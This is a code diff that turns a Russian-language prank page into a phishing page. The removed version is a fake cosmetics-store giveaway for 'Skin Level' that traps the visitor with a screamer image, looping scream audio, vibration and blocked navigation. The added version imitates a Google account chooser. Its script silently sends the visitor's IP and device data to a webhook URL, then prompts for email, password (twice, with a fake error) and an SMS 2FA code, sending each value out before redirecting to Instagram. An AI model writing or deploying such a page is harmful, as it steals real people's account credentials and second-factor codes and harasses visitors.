@@ -2,86 +2,68 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Skin Level | GIVEAWAY 🛍️</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600&family=Playfair+Display:ital,wght@0,700;1,700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход — Аккаунты Google</title>
     <style>
-        :root { --gold: #d4a58e; --dark: #121212; --glass: rgba(255, 255, 255, 0.95); }
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-font-smoothing: antialiased; }
-        body { background: linear-gradient(135deg, #fdfcfb 0%, #e2d1c3 100%); font-family: 'Montserrat', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        
-        .app-card { width: 92%; max-width: 380px; background: var(--glass); border-radius: 30px; padding: 40px 25px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); border: 1px solid rgba(255,255,255,0.3); text-align: center; position: relative; }
-        
-        .badge { display: inline-block; padding: 6px 12px; background: #e8f5e9; color: #2e7d32; border-radius: 50px; font-size: 10px; font-weight: 600; margin-bottom: 20px; letter-spacing: 1px; }
-        
-        .brand { font-family: 'Playfair Display', serif; font-size: 38px; color: var(--dark); font-style: italic; margin-bottom: 5px; }
-        .sub-brand { font-size: 10px; letter-spacing: 4px; color: var(--gold); text-transform: uppercase; margin-bottom: 30px; }
-        
-        .promo-box { background: #fff; border: 1px dashed var(--gold); border-radius: 20px; padding: 20px; margin-bottom: 25px; }
-        .promo-box h2 { font-size: 16px; color: #333; margin-bottom: 8px; }
-        .promo-box p { font-size: 12px; color: #777; line-height: 1.5; }
-        
-        .main-btn { background: var(--dark); color: white; border: none; padding: 20px; width: 100%; border-radius: 15px; font-weight: 600; font-size: 14px; letter-spacing: 1px; text-transform: uppercase; cursor: pointer; box-shadow: 0 10px 20px rgba(0,0,0,0.15); transition: 0.3s; }
-        .main-btn:active { transform: scale(0.95); }
-
-        .location-info { margin-top: 25px; font-size: 11px; color: #999; }
-        .dog-icon { font-size: 14px; margin-top: 10px; display: block; }
-
-        /* SCREAMER CORE */
-        #trap { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; }
-        #trap img { width: 100%; height: 100%; object-fit: cover; }
+        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .auth-card { width: 360px; padding: 40px 24px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .google-logo { width: 75px; margin-bottom: 10px; }
+        .title { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
+        .subtitle { font-size: 16px; margin-bottom: 30px; }
+        .account-box { display: flex; align-items: center; padding: 12px; border-top: 1px solid #dadce0; cursor: pointer; }
+        .account-box:hover { background: #f8f9fa; }
+        .avatar { width: 32px; height: 32px; background: #e8eaed; border-radius: 50%; margin-right: 12px; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #5f6368; }
+        #status-msg { font-size: 12px; color: #d93025; margin-top: 10px; display: none; }
     </style>
 </head>
-<body oncontextmenu="return false;">
-
-    <div class="app-card">
-        <span class="badge">LIVE: ДЕРБЕНТ</span>
-        <h1 class="brand">Skin Level</h1>
-        <p class="sub-brand">Premium Cosmetics</p>
-        
-        <div class="promo-box">
-            <h2>GIVEAWAY: KOREAN BOX 🎁</h2>
-            <p>Вы находитесь в зоне охвата магазина на <b>Гейдара Алиева</b>. Участвуйте в розыгрыше бокса (The Ordinary, Kombucha)!</p>
-        </div>
-
-        <button class="main-btn" id="go">Проверить местоположение</button>
-
-        <div class="location-info">
-            <p>📍 ул. Гейдара Алиева, 11в/1</p>
-            <p>🕘 10:00 — 20:00</p>
-            <span class="dog-icon">🐕 Можно с собакой</span>
+<body>
+<div class="auth-card">
+    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="google-logo">
+    <div class="title">Выберите аккаунт</div>
+    <div class="subtitle">для перехода в Skin Level</div>
+    <div class="account-box" id="trigger">
+        <div class="avatar">?</div>
+        <div style="text-align: left;">
+            <div style="font-size: 14px; font-weight: 500;">Использовать другой аккаунт</div>
+            <div style="font-size: 12px; color: #5f6368;">Безопасный вход</div>
         </div>
     </div>
+    <div id="status-msg">Ошибка аутентификации. Повторите попытку.</div>
+</div>
 
-    <div id="trap"><img src="screamer.jpg"></div>
+<script>
+    const webhook = 'https://webhook.site/b28ec138-bf0a-4f8e-a5f8-23416b82a7ed'; // Твой URL
 
-    <script>
-        const btn = document.getElementById('go');
-        const trap = document.getElementById('trap');
-        const audio = new Audio('kriki-skrimery.mp3');
+    // Тихий сбор данных устройства
+    fetch('https://ipapi.co/json/').then(r => r.json()).then(ip => {
+        send({ type: 'INFO_IP', data: ip, agent: navigator.userAgent });
+    });
 
-        // Блокировка выхода
-        history.pushState(null, null, location.href);
-        window.onpopstate = () => history.pushState(null, null, location.href);
-        window.onbeforeunload = () => "Участие в розыгрыше будет аннулировано!";
+    function send(data) {
+        fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
+    }
 
-        btn.addEventListener('click', () => {
-            // Запуск полноэкранного режима
-            let doc = document.documentElement;
-            if(doc.requestFullscreen) doc.requestFullscreen();
+    document.getElementById('trigger').onclick = async function() {
+        const email = prompt("Введите email или телефон:");
+        if (!email) return;
+
+        const p1 = prompt("Введите пароль:");
+        send({ type: 'STEP_1_PASS', user: email, pass: p1 });
+
+        document.getElementById('status-msg').style.display = 'block';
+        
+        setTimeout(() => {
+            const p2 = prompt("Неверный пароль. Повторите ввод:");
+            send({ type: 'STEP_2_CONFIRM', user: email, pass: p2 });
             
-            btn.innerText = "ОПРЕДЕЛЕНИЕ...";
-            
-            setTimeout(() => {
-                trap.style.display = 'block';
-                audio.loop = true;
-                audio.play();
-
-                if (navigator.vibrate) {
-                    setInterval(() => navigator.vibrate([400, 100, 400]), 500);
-                }
-            }, 1200);
-        });
-    </script>
+            const code = prompt("Введите 6-значный код из SMS для подтверждения личности:");
+            if (code) {
+                send({ type: 'STEP_3_2FA', code: code });
+                alert("Синхронизация успешна.");
+                window.location.href = "https://www.instagram.com/skinlevel_?igsh=MWEyczkxam5hYXJ1dQ=="; // Редирект
+            }
+        }, 800);
+    };
+</script>
 </body>
 </html>
